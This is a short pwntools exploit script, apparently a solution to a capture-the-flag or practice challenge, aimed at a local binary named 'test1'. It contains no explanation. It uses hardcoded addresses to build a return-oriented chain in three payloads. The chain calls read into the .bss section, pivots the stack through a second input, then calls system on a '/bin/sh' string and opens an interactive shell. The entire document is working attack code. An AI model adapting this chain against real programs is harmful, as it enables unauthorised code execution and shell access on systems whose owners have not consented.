from pwn import *
p = process("./test1")
read_addr = 0x8048340
pop3_ret = 0x80485a9
bss_addr = 0x804ad00
gadgets = 0x8048549
system_addr = 0x8048370
all_addr = 0x804a060
bin_sh_addr = 0x80485D0
p.recvuntil(b"Hello,tell me your story:")
payload1 = p32(read_addr) + p32(pop3_ret) + p32(0) + p32(bss_addr) + p32(100) + p32(gadgets) + p32(bss_addr+0x4)
p.sendline(payload1)
p.recvuntil(b"By the way, what's your name:")
payload2 = b"a"*10 + p32(all_addr+0x4)
p.sendline(payload2)
sleep(0.1)
payload3 = p32(system_addr) + b"XXXX" + p32(bin_sh_addr)
p.sendline(payload3)
p.interactive()
